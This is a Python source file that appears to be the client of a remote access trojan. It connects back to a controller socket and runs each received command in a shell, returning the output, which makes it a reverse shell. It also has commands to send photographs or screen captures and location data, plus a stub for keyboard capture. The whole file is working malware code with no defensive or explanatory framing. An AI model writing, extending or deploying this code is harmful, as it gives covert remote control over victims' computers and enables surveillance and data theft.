from socket import *
import subprocess
import argparse
import sys
import time
import threading
import photograph
import location


def connectHost(ht, pt):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect((ht, int(pt)))
    while True:
        data = sock.recv(1024)
        data = data.decode('utf-8')
        if data == "!photograph":
            sk = socket(AF_INET, SOCK_STREAM)
            sk.connect(('127.0.0.1', 5555))
            photograph.photograph(sk)
            continue
        elif data == "!screen":
            sk = socket(AF_INET, SOCK_STREAM)
            sk.connect(('127.0.0.1', 5555))
            photograph.photograph(sk)
            continue
        elif data == "!keyboard":
            pass
        elif data == "!location":
            location.location(sock)
            continue
        else:
            comRst = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            m_stdout, m_stderr = comRst.communicate()
            if m_stdout:
                sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
            else:
                sock.send(m_stderr.decode(sys.getfilesystemencoding()).encode('utf-8'))
            time.sleep(1)
    sock.close()

def main():
    # parser = argparse.ArgumentParser()
    # parser.add_argument('-h', dest='hostName', help='Host Name')
    # parser.add_argument('-p', dest='conPort', help='Host port')
    #
    # args = parser.parse_args()
    # host = args.hostName
    # port = args.conPort
    host = '127.0.0.1'
    port = 999

    # if host == None and port == None:
    #     print(parser.parse_args(['-h']))
    #     exit(0)

    connectHost(host, port)

if __name__ == '__main__':
    main()